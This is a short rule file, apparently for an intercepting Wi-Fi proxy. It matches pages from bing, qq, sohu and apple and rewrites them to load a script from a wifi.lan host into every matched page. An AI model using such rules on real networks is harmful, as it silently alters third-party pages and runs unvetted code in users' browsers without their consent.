use("uniqlo")
use("nikon")
use("crisp")
use("weibo-custom-message")
use("weibo-custom-timeline")
http()
    .url(/(bing|qq|sohu|apple)/i)
    .loadContent()
    .modify(/<\/body>/i, `
        <script src='http://wifi.lan/mindshare/menu.js'></script>
        </body>
    `)
